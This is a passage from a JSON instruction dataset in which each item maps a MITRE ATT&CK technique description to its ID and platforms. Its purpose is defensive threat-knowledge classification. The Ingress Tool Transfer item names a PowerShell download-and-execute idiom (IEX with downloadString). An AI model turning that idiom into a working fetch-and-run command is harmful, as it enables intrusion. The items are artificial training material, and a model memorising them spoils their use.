    "instruction": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.?",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Phishing: Spearphishing Attachment (T1566.001);\nTechnique Phishing: Spearphishing Attachment (T1566.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
      "answer": "The provided description is related to MITRE technique Phishing: Spearphishing Attachment (T1566.001);\nTechnique Phishing: Spearphishing Attachment (T1566.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
    "context": "",
    "output": "The provided description is related to MITRE technique User Execution: Malicious Link (T1204.001);\nTechnique User Execution: Malicious Link (T1204.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
      "answer": "The provided description is related to MITRE technique User Execution: Malicious Link (T1204.001);\nTechnique User Execution: Malicious Link (T1204.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Non-Application Layer Protocol (T1095);\nTechnique Non-Application Layer Protocol (T1095) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
      "answer": "The provided description is related to MITRE technique Non-Application Layer Protocol (T1095);\nTechnique Non-Application Layer Protocol (T1095) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. This type of prompt can be used to collect credentials via various languages such as AppleScript and PowerShell. On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. Unix Shell).\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., Browser Information Discovery and/or Application Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.",
    "context": "",
    "output": "The provided description is related to MITRE technique Input Capture: GUI Input Capture (T1056.002);\nTechnique Input Capture: GUI Input Capture (T1056.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. This type of prompt can be used to collect credentials via various languages such as AppleScript and PowerShell. On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. Unix Shell).\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., Browser Information Discovery and/or Application Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.",
      "answer": "The provided description is related to MITRE technique Input Capture: GUI Input Capture (T1056.002);\nTechnique Input Capture: GUI Input Capture (T1056.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.\n\nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).",
    "context": "",
    "output": "The provided description is related to MITRE technique Gather Victim Identity Information: Employee Names (T1589.003);\nTechnique Gather Victim Identity Information: Employee Names (T1589.003) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.\n\nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: Phishing or Valid Accounts).",
      "answer": "The provided description is related to MITRE technique Gather Victim Identity Information: Employee Names (T1589.003);\nTechnique Gather Victim Identity Information: Employee Names (T1589.003) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Network Connections Discovery (T1049);\nTechnique System Network Connections Discovery (T1049) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).",
      "answer": "The provided description is related to MITRE technique System Network Connections Discovery (T1049);\nTechnique System Network Connections Discovery (T1049) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
    "context": "",
    "output": "The provided description is related to MITRE technique Obtain Capabilities: Tool (T1588.002);\nTechnique Obtain Capabilities: Tool (T1588.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
      "answer": "The provided description is related to MITRE technique Obtain Capabilities: Tool (T1588.002);\nTechnique Obtain Capabilities: Tool (T1588.002) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.",
    "context": "",
    "output": "The provided description is related to MITRE technique Valid Accounts (T1078);\nTechnique Valid Accounts (T1078) is applicable to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.",
      "answer": "The provided description is related to MITRE technique Valid Accounts (T1078);\nTechnique Valid Accounts (T1078) is applicable to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. Remote Data Staging). <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.",
    "context": "",
    "output": "The provided description is related to MITRE technique Archive Collected Data: Archive via Utility (T1560.001);\nTechnique Archive Collected Data: Archive via Utility (T1560.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. Remote Data Staging). <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.",
      "answer": "The provided description is related to MITRE technique Archive Collected Data: Archive via Utility (T1560.001);\nTechnique Archive Collected Data: Archive via Utility (T1560.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.\n\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.?",
    "context": "",
    "output": "The provided description is related to MITRE technique External Remote Services (T1133);\nTechnique External Remote Services (T1133) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.\n\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.",
      "answer": "The provided description is related to MITRE technique External Remote Services (T1133);\nTechnique External Remote Services (T1133) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
